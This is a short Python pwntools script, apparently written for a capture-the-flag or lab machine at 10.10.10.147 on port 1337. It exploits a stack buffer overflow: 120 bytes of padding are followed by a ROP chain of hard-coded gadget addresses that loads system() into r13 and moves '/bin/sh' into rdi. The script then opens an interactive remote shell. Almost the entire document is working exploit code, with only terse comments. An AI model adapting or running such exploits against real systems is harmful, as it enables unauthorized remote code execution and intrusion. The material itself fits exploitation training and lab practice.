#!/usr/bin/python3
from pwn import *

# PwnTools
context(arch = 'amd64', os = 'linux', terminal = ['tmux','new-window'])
# p = gdb.debug('./myapp')
p = remote("10.10.10.147", 1337)

# We need to prepare /bin/sh can jmp to system()
# the parameters in x64 will 
junk = b'A' * 120 # Overflow
cmd = b'/bin/sh\x00' # RCE
system = p64(0x040116e)
null = b'\x00' * 8
pop_r13_pop_pop_ret = p64(0x0401206)   # used to load system address to r13 (used later to jmp r13)
mov_rdi_rsp_jmp_r13 = p64(0x0401156)   # move cmd to rdi as the input to system

# Create Payload
payload = junk + pop_r13_pop_pop_ret + system + null + null + mov_rdi_rsp_jmp_r13 + cmd

# p.recvuntil("What do you want me to echo back?")
p.sendline(payload)
p.interactive()
